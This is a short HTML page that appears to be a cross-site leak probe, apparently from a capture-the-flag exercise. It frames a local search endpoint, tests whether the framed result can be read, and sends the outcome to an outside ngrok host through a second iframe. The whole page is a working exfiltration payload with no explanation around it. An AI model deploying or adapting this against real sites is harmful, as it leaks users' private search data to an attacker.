
<html>
    <head>
        <script>
            const afterLoad = function() {
                  const iframe = document.createElement("iframe")
                  let text = "";
                try {
                    if (document.getElementsByTagName("iframe")[0]) {
                        text = "iframe"
                    }
                    if (document.getElementsByTagName("iframe")[0].innerHTML) {
                        text = "pre"
                    }
                        }
                    catch (error) {
                        text = error
                    }
                
                  iframe.src = "https://nonspirited-zoie-bilocular.ngrok-free.dev/" + text
                  document.body.append(iframe)
              }
          </script>
    </head> 
      <body>
    
          <iframe src="http://127.0.0.1:8000/search?query=D" id="query" onerror="afterLoad()" onload="afterLoad()"></iframe>
      </body>
</html>
